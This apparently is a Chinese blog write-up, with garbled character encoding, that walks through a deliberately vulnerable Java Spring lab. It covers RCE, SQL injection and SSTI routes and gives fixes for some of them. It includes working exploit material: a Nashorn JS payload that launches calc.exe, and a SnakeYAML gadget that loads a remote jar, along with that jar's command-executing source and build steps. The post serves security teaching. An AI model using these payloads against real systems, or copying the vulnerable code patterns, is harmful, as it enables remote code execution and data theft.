class="toc-text">5.è·¯ç”±&#x2F;cookie&#x2F;vuln05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln06"><span class="toc-text">6.è·¯ç”±&#x2F;cookie&#x2F;vuln06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">æ¼æ´åˆ©ç”¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81CORS"><span class="toc-text">åã€CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-origin"><span class="toc-text">1.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;origin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-setHeader"><span class="toc-text">2.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;setHeader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-crossOrigin"><span class="toc-text">3.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">æ¼æ´éªŒè¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">æ¼æ´é˜²å¾¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6origin"><span class="toc-text">ï¼ˆ1ï¼‰é™åˆ¶origin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89WebMvcConfigurer%E8%AE%BE%E7%BD%AECors"><span class="toc-text">ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89spring-security%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">ï¼ˆ3ï¼‰spring securityè®¾ç½®cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%87%AA%E5%AE%9A%E4%B9%89filter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89CorsFilter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%886%EF%BC%89origin%E6%A3%80%E6%9F%A5"><span class="toc-text">ï¼ˆ6ï¼‰originæ£€æŸ¥</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">åä¸€ã€ç›®å½•éå†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-path-traversal-x2F-vul"><span class="toc-text">1.è·¯ç”±&#x2F;path_traversal&#x2F;vul</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">åäºŒã€æ–‡ä»¶ä¸Šä¼ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-file-x2F-upload"><span class="toc-text">1.è·¯ç”±&#x2F;file&#x2F;upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">åä¸‰ã€SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln1"><span class="toc-text">1.è·¯ç”±&#x2F;spel&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln2"><span class="toc-text">2.è·¯ç”±&#x2F;spel&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">æ¼æ´ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81Deserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">åå››ã€Deserializeååºåˆ—åŒ–</span></a></li></ol></div></p>
<h2 id="ä¸€ã€RCE"><a href="#ä¸€ã€RCE" class="headerlink" title="ä¸€ã€RCE"></a>ä¸€ã€RCE</h2><h3 id="1-è·¯ç”±-x2F-rce-x2F-runtime-x2F-exec"><a href="#1-è·¯ç”±-x2F-rce-x2F-runtime-x2F-exec" class="headerlink" title="1.è·¯ç”±&#x2F;rce&#x2F;runtime&#x2F;exec"></a>1.è·¯ç”±&#x2F;rce&#x2F;runtime&#x2F;exec</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@GetMapping(&quot;/runtime/exec&quot;)
    public String CommandExec(String cmd) &#123;
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try &#123;
            Process p = run.exec(cmd);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) &#123;
                sb.append(tmpStr);
            &#125;

            if (p.waitFor() != 0) &#123;
                if (p.exitValue() == 1)
                    return &quot;Command exec failed!!&quot;;
            &#125;

            inBr.close();
            in.close();
        &#125; catch (Exception e) &#123;
            return e.toString();
        &#125;
        return sb.toString();
    &#125;
</code></pre>
<p>è¯¥ä»£ç é€šè¿‡GETè¯·æ±‚æ¥æ”¶ä¸€ä¸ªcmdå‚æ•°ï¼Œæ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²ç”¨execå‘½ä»¤æ‰§è¡Œï¼Œåˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
<img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927145407277.png" alt="image-20240927145407277" style="zoom:200%;" />



<h3 id="2-è·¯ç”±-x2F-rce-x2F-ProcessBuilder"><a href="#2-è·¯ç”±-x2F-rce-x2F-ProcessBuilder" class="headerlink" title="2.è·¯ç”±&#x2F;rce&#x2F;ProcessBuilder"></a>2.è·¯ç”±&#x2F;rce&#x2F;ProcessBuilder</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">@GetMapping(&quot;/ProcessBuilder&quot;)
    public String processBuilder(String cmd) &#123;

        StringBuilder sb = new StringBuilder();

        try &#123;
            String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) &#123;
                sb.append(tmpStr);
            &#125;
        &#125; catch (Exception e) &#123;
            return e.toString();
        &#125;

        return sb.toString();
    &#125;
</code></pre>
<p>è¯¥ä»£ç é€šè¿‡GETè¯·æ±‚æ¥æ”¶ä¸€ä¸ªcmdå‚æ•°ï¼Œåˆ©ç”¨ProcessBuilderç±»è°ƒç”¨æ“ä½œç³»ç»Ÿè¿›ç¨‹è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨windowsç³»ç»Ÿä¸­è¦è¿™ä¹ˆå†™ï¼š</p>
<pre><code class="Java">String[] arrCmd = &#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;
</code></pre>
<p>åˆ©ç”¨è¿‡ç¨‹ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927151028420.png" alt="image-20240927151028420"></p>
<h3 id="3-è·¯ç”±-x2F-rce-x2F-jscmd"><a href="#3-è·¯ç”±-x2F-rce-x2F-jscmd" class="headerlink" title="3.è·¯ç”±&#x2F;rce&#x2F;jscmd"></a>3.è·¯ç”±&#x2F;rce&#x2F;jscmd</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@GetMapping(&quot;/jscmd&quot;)
    public void jsEngine(String jsurl) throws Exception&#123;
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;);
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format(&quot;load(\&quot;%s\&quot;)&quot;, jsurl);
        engine.eval(cmd, bindings);
    &#125;
</code></pre>
<p>è¯¥ä»£ç é€šè¿‡è¿œç¨‹åŠ è½½ä¸€ä¸ªjsè„šæœ¬ä»£ç ï¼Œç„¶åé€šè¿‡ScriptEngineç±»è§£ææ‰§è¡Œï¼Œæˆ‘ä»¬çš„jsè„šæœ¬ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="js">var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);
</code></pre>
<p>ç”±äºè¯¥å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾ï¼Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨è®¡ç®—å™¨çš„æ–¹å¼è¯æ˜å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927152514570.png" alt="image-20240927152514570"></p>
<h3 id="4-è·¯ç”±-x2F-rce-x2F-vuln-x2F-yarm"><a href="#4-è·¯ç”±-x2F-rce-x2F-vuln-x2F-yarm" class="headerlink" title="4.è·¯ç”±&#x2F;rce&#x2F;vuln&#x2F;yarm"></a>4.è·¯ç”±&#x2F;rce&#x2F;vuln&#x2F;yarm</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java"> @GetMapping(&quot;/vuln/yarm&quot;)
    public void yarm(String content) &#123;
        Yaml y = new Yaml();
        y.load(content);
    &#125;
</code></pre>
<p>è¯¥ä»£ç åˆ©ç”¨SnakeYAMLå­˜åœ¨çš„ååºåˆ—åŒ–æ¼æ´æ¥rceï¼Œåœ¨è§£ææ¶æ„ yml å†…å®¹æ—¶ä¼šå®ŒæˆæŒ‡å®šçš„åŠ¨ä½œï¼Œå®ç°å‘½ä»¤æ‰§è¡Œã€‚æˆ‘ä»¬æ‰€åŠ è½½çš„yamlæ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<pre><code class="yaml">!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL [&quot;http://127.0.0.1/yaml-payload.jar&quot;]
  ]]
]
</code></pre>
<p>jaræ˜¯æˆ‘ä»¬è¿œç¨‹åŠ è½½çš„æ¶æ„æ–‡ä»¶ï¼Œå…¶æºç å¦‚ä¸‹ï¼š</p>
<pre><code class="java">package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;

    public AwesomeScriptEngineFactory() &#123;
        try &#123;
            Runtime.getRuntime().exec(&quot;whoami&quot;);
            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
        &#125; catch (IOException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;

    @Override
    public String getEngineName() &#123;
        return null;
    &#125;

    @Override
    public String getEngineVersion() &#123;
        return null;
    &#125;

    @Override
    public List&lt;String&gt; getExtensions() &#123;
        return null;
    &#125;

    @Override
    public List&lt;String&gt; getMimeTypes() &#123;
        return null;
    &#125;

    @Override
    public List&lt;String&gt; getNames() &#123;
        return null;
    &#125;

    @Override
    public String getLanguageName() &#123;
        return null;
    &#125;

    @Override
    public String getLanguageVersion() &#123;
        return null;
    &#125;

    @Override
    public Object getParameter(String key) &#123;
        return null;
    &#125;

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) &#123;
        return null;
    &#125;

    @Override
    public String getOutputStatement(String toDisplay) &#123;
        return null;
    &#125;

    @Override
    public String getProgram(String... statements) &#123;
        return null;
    &#125;

    @Override
    public ScriptEngine getScriptEngine() &#123;
        return null;
    &#125;
&#125;
</code></pre>
<p>å› ä¸ºæ˜¯ä½¿ç”¨äº†ScriptEngineFactoryæ¥å£ï¼Œè¯¥æ¥å£ä¸­å­˜åœ¨æŠ½è±¡æ–¹æ³•æ‰€ä»¥è¦å¯¹ä¸€äº›æŠ½è±¡æ–¹æ³•è¿›è¡Œé‡æ„ã€‚ä½¿ç”¨ä¸‹é¢å‘½ä»¤æ‰“åŒ…ç”Ÿæˆjaræ–‡ä»¶</p>
<pre><code>javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
</code></pre>
<p>payloadé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
<p>æ¼æ´éªŒè¯ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927162828252.png" alt="image-20240927162828252"></p>
<p>æ¼æ´ä¿®å¤ï¼š</p>
<pre><code class="java">Yaml y = new Yaml(new SafeConstructor());
</code></pre>
<h3 id="5-è·¯ç”±-x2F-rce-x2F-groovy"><a href="#5-è·¯ç”±-x2F-rce-x2F-groovy" class="headerlink" title="5.è·¯ç”±&#x2F;rce&#x2F;groovy"></a>5.è·¯ç”±&#x2F;rce&#x2F;groovy</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">@GetMapping(&quot;groovy&quot;)
public void groovyshell(String content) &#123;
    GroovyShell groovyShell = new GroovyShell();
    groovyShell.evaluate(content);
&#125;
</code></pre>
<p>åˆ©ç”¨groovyè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ¼æ´åˆ©ç”¨å¦‚ä¸‹ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927163939476.png" alt="image-20240927163939476"></p>
<h2 id="äºŒã€SQLæ³¨å…¥"><a href="#äºŒã€SQLæ³¨å…¥" class="headerlink" title="äºŒã€SQLæ³¨å…¥"></a>äºŒã€SQLæ³¨å…¥</h2><h3 id="1-è·¯ç”±-x2F-sqli-x2F-jdbc-x2F-vuln"><a href="#1-è·¯ç”±-x2F-sqli-x2F-jdbc-x2F-vuln" class="headerlink" title="1.è·¯ç”±&#x2F;sqli&#x2F;jdbc&#x2F;vuln"></a>1.è·¯ç”±&#x2F;sqli&#x2F;jdbc&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@RequestMapping(&quot;/jdbc/vuln&quot;)
    public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;

        StringBuilder result = new StringBuilder();

        try &#123;
            Class.forName(driver);
            Connection con = DriverManager.getConnection(url, user, password);

            if (!con.isClosed())
                System.out.println(&quot;Connect to database successfully.&quot;);

            // sqli vuln code
            Statement statement = con.createStatement();
            String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
            logger.info(sql);
            ResultSet rs = statement.executeQuery(sql);

            while (rs.next()) &#123;
                String res_name = rs.getString(&quot;username&quot;);
                String res_pwd = rs.getString(&quot;password&quot;);
                String info = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);
                result.append(info);
                logger.info(info);
            &#125;
            rs.close();
            con.close();


        &#125; catch (ClassNotFoundException e) &#123;
            logger.error(&quot;Sorry, can&#39;t find the Driver!&quot;);
        &#125; catch (SQLException e) &#123;
            logger.error(e.toString());
        &#125;
        return result.toString();
    &#125;
</code></pre>
<p>æ¼æ´æˆå› ä»£ç ï¼š</p>
<pre><code>String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
</code></pre>
<p>GETæ¥æ”¶åˆ°çš„å‚æ•°ç›´æ¥ä¸SQLè¯­å¥è¿›è¡Œæ‹¼æ¥ï¼Œå¯ä»¥é€šè¿‡é—­åˆå¼•å·å®ç°ç»•è¿‡ï¼ŒéªŒè¯å¦‚ä¸‹ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927165141332.png" alt="image-20240927165141332"></p>
<h3 id="2-è·¯ç”±-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><a href="#2-è·¯ç”±-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln" class="headerlink" title="2.è·¯ç”±&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln"></a>2.è·¯ç”±&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)
public String jdbc_ps_vuln(@RequestParam(&quot;username&quot;) String username) &#123;

    StringBuilder result = new StringBuilder();
    try &#123;
        Class.forName(driver);
        Connection con = DriverManager.getConnection(url, user, password);

        if (!con.isClosed())
            System.out.println(&quot;Connecting to Database successfully.&quot;);

        String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
        PreparedStatement st = con.prepareStatement(sql);

        logger.info(st.toString());
        ResultSet rs = st.executeQuery();

        while (rs.next()) &#123;
            String res_name = rs.getString(&quot;username&quot;);
            String res_pwd = rs.getString(&quot;password&quot;);
            String info = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);
            result.append(info);
            logger.info(info);
        &#125;

        rs.close();
        con.close();

    &#125; catch (ClassNotFoundException e) &#123;
        logger.error(&quot;Sorry, can&#39;t find the Driver!&quot;);
        e.printStackTrace();
    &#125; catch (SQLException e) &#123;
        logger.error(e.toString());
    &#125;
    return result.toString();
&#125;
</code></pre>
<p>æ¼æ´æˆå› ä»£ç ï¼š</p>
<pre><code> String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
            PreparedStatement st = con.prepareStatement(sql);
</code></pre>
<p>è¿™é‡Œè™½ç„¶ä½¿ç”¨äº†prepareStatementè¿›è¡Œé¢„ç¼–è¯‘å¤„ç†ï¼Œå¯æ˜¯sqlè¯­å¥åœ¨è¿›å…¥prepareStatementä¹‹å‰å°±å·²ç»å’ŒGETæ¥æ”¶çš„å‚æ•°è¿›è¡Œæ‹¼æ¥ï¼Œå› æ­¤ä»ä¸èµ·åˆ°é˜²æŠ¤ä½œç”¨ï¼Œå¤ç°è¿‡ç¨‹åŒä¸Šã€‚</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927170714658.png" alt="image-20240927170714658"></p>
<h3 id="3-è·¯ç”±-x2F-sqli-x2F-mybatis-x2F-vuln01"><a href="#3-è·¯ç”±-x2F-sqli-x2F-mybatis-x2F-vuln01" class="headerlink" title="3.è·¯ç”±&#x2F;sqli&#x2F;mybatis&#x2F;vuln01"></a>3.è·¯ç”±&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">public List&lt;User&gt; mybatisVuln01(@RequestParam(&quot;username&quot;) String username) &#123;
        return userMapper.findByUserNameVuln01(username);
    &#125;
</code></pre>
<p>å†æ¥çœ‹å‡½æ•°<code>findByUserNameVuln01</code>å®šä¹‰ï¼š</p>
<pre><code class="java">@Select(&quot;select * from users where username = &#39;$&#123;username&#125;&#39;&quot;)
    List&lt;User&gt; findByUserNameVuln01(@Param(&quot;username&quot;) String username);
</code></pre>
<p>è¯¥ä»£ç ä½¿ç”¨ MyBatisæ¡†æ¶ï¼Œç”¨æ¥æŒ‡å®š SQL æŸ¥è¯¢è¯­å¥ã€‚**<code>$&#123;username&#125;</code>**ï¼šåœ¨è¿™é‡Œï¼Œ<code>username</code> æ˜¯ç›´æ¥æ‹¼æ¥åˆ° SQL æŸ¥è¯¢ä¸­çš„ã€‚è¿™æ„å‘³ç€è¾“å…¥çš„å†…å®¹ä¼šç›´æ¥æ’å…¥åˆ° SQL è¯­å¥ä¸­ï¼Œè€Œä¸ä¼šè¿›è¡Œä»»ä½•é¢„å¤„ç†æˆ–è½¬ä¹‰ã€‚å› æ­¤æˆ‘ä»¬ä»ç„¶å¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•è¿›è¡ŒSQLæ³¨å…¥ã€‚</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927171602990.png" alt="image-20240927171602990"></p>
<p>ä¿®å¤ä»£ç ï¼š</p>
<pre><code>@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)
</code></pre>
<h3 id="3-è·¯ç”±-x2F-sqli-x2F-mybatis-x2F-vuln02"><a href="#3-è·¯ç”±-x2F-sqli-x2F-mybatis-x2F-vuln02" class="headerlink" title="3.è·¯ç”±&#x2F;sqli&#x2F;mybatis&#x2F;vuln02"></a>3.è·¯ç”±&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java"> @GetMapping(&quot;/mybatis/vuln02&quot;)
    public List&lt;User&gt; mybatisVuln02(@RequestParam(&quot;username&quot;) String username) &#123;
        return userMapper.findByUserNameVuln02(username);
    &#125;
</code></pre>
<p>å†æ¥çœ‹å‡½æ•°<code>findByUserNameVuln02</code>å®šä¹‰</p>
<pre><code class="Java">List&lt;User&gt; findByUserNameVuln02(String username);
</code></pre>
<p>å»æ‰äº†æ˜ å°„å…³ç³»ï¼Œä¸å½±å“æ¼æ´å­˜åœ¨ï¼Œä»å¯ç”¨åŸpayloadï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927172317279.png" alt="image-20240927172317279"></p>
<h3 id="4-è·¯ç”±-x2F-mybatis-x2F-orderby-x2F-vuln03"><a href="#4-è·¯ç”±-x2F-mybatis-x2F-orderby-x2F-vuln03" class="headerlink" title="4.è·¯ç”±&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>4.è·¯ç”±&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java"> @GetMapping(&quot;/mybatis/orderby/vuln03&quot;)
    public List&lt;User&gt; mybatisVuln03(@RequestParam(&quot;sort&quot;) String sort) &#123;
        return userMapper.findByUserNameVuln03(sort);
    &#125;
</code></pre>
<p>å†æ¥çœ‹å‡½æ•°<code>findByUserNameVuln03</code>å®šä¹‰</p>
<pre><code class="java">List&lt;User&gt; findByUserNameVuln03(@Param(&quot;order&quot;) String order);
</code></pre>
<p>ä½¿ç”¨MyBatisæ¡†æ¶ä¸­çš„orderå­—æ®µï¼Œæ¢ç”¨ä¸‹é¢æ–¹æ³•è¿›è¡Œæ³¨å…¥ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927174250625.png" alt="image-20240927174250625"></p>
<h3 id="sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤"><a href="#sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤" class="headerlink" title="sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤"></a>sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤</h3><h4 id="ï¼ˆ1ï¼‰é¢„ç¼–è¯‘"><a href="#ï¼ˆ1ï¼‰é¢„ç¼–è¯‘" class="headerlink" title="ï¼ˆ1ï¼‰é¢„ç¼–è¯‘"></a>ï¼ˆ1ï¼‰é¢„ç¼–è¯‘</h4><pre><code>String sql = &quot;select * from users where username = ?&quot;;
PreparedStatement st = con.prepareStatement(sql);
</code></pre>
<h4 id="ï¼ˆ2ï¼‰waf"><a href="#ï¼ˆ2ï¼‰waf" class="headerlink" title="ï¼ˆ2ï¼‰waf"></a>ï¼ˆ2ï¼‰waf</h4><pre><code class="java"> private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);
 public static String sqlFilter(String sql) &#123;
        if (!FILTER_PATTERN.matcher(sql).matches()) &#123;
            return null;
        &#125;
        return sql;
    
</code></pre>
<h4 id="ï¼ˆ3ï¼‰MyBatisé˜²æŠ¤"><a href="#ï¼ˆ3ï¼‰MyBatisé˜²æŠ¤" class="headerlink" title="ï¼ˆ3ï¼‰MyBatisé˜²æŠ¤"></a>ï¼ˆ3ï¼‰MyBatisé˜²æŠ¤</h4><pre><code>@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)
</code></pre>
<h2 id="ä¸‰ã€SSTI"><a href="#ä¸‰ã€SSTI" class="headerlink" title="ä¸‰ã€SSTI"></a>ä¸‰ã€SSTI</h2><h3 id="1-è·¯ç”±-x2F-ssti-x2F-velocity"><a href="#1-è·¯ç”±-x2F-ssti-x2F-velocity" class="headerlink" title="1.è·¯ç”±&#x2F;ssti&#x2F;velocity"></a>1.è·¯ç”±&#x2F;ssti&#x2F;velocity</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="java">  @GetMapping(&quot;/velocity&quot;)
    public void velocity(String template) &#123;
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put(&quot;author&quot;, &quot;Elliot A.&quot;);
        context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);
        context.put(&quot;phone&quot;, &quot;555-1337&quot;);

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, &quot;test&quot;, template);
    &#125;
&#125;
</code></pre>
<p>Apache Velocityæ˜¯ä¸€ä¸ªåŸºäºæ¨¡æ¿çš„å¼•æ“ï¼Œç”¨äºç”Ÿæˆæ–‡æœ¬è¾“å‡º(ä¾‹å¦‚ï¼šHTMLã€XMLæˆ–ä»»ä½•å…¶ä»–å½¢å¼çš„ASCIIæ–‡æœ¬)ï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯æä¾›ä¸€ç§ç®€å•ä¸”çµæ´»çš„æ–¹å¼æ¥å°†æ¨¡æ¿å’Œä¸Šä¸‹æ–‡æ•°æ®ç»“åˆåœ¨ä¸€èµ·ï¼Œå› æ­¤è¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨ç¨‹åºä¸­åŒ…æ‹¬Webåº”ç”¨ã€‚å…·ä½“Apache Velocityå¼•æ“çš„åº”ç”¨å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/716756926">è¿™ç¯‡åšå®¢</a>ã€‚</p>
<p><strong>Velocity.evaluate</strong></p>
<p>Velocity.evaluateæ˜¯Velocityå¼•æ“ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºå¤„ç†å­—ç¬¦ä¸²æ¨¡æ¿çš„è¯„ä¼°ï¼ŒVelocityæ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ¨¡æ¿å¼•æ“ï¼Œå¹¿æ³›åº”ç”¨äºWEBå¼€å‘å’Œå…¶ä»–éœ€è¦åŠ¨æ€å†…å®¹ç”Ÿæˆçš„åœºåˆï¼ŒVelocity.evaluateæ–¹æ³•çš„ä¸»è¦ä½œç”¨æ˜¯å°†ç»™å®šçš„æ¨¡æ¿å­—ç¬¦ä¸²ä¸ä¸Šä¸‹æ–‡å¯¹è±¡ç»“åˆå¹¶ç”Ÿæˆæœ€ç»ˆçš„è¾“å‡ºç»“æœï¼Œè¿™ä¸ªæ–¹æ³•é€šå¸¸ç”¨äºåœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ›å»ºå†…å®¹ï¼Œæ¯”å¦‚ï¼šç”ŸæˆHTMLé¡µé¢çš„å†…å®¹æˆ–ç”µå­é‚®ä»¶çš„æ–‡æœ¬ï¼Œæ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="text">public static void evaluate(Context context, Writer writer, String templateName, String template)
</code></pre>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li>Context contextï¼šæä¾›æ¨¡æ¿æ‰€éœ€çš„æ•°æ®ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥åŒ…å«å¤šä¸ªé”®å€¼å¯¹</li>
<li>Writer writerï¼šè¾“å‡ºæµï¼Œç”¨äºå†™å…¥ç”Ÿæˆçš„å†…å®¹</li>
<li>String templateNameï¼šæ¨¡æ¿çš„åç§°ï¼Œé€šå¸¸ç”¨äºè°ƒè¯•ä¿¡æ¯ä¸­</li>
<li>String templateï¼šè¦è¯„ä¼°çš„æ¨¡æ¿å­—ç¬¦ä¸²</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹payloadï¼š</p>
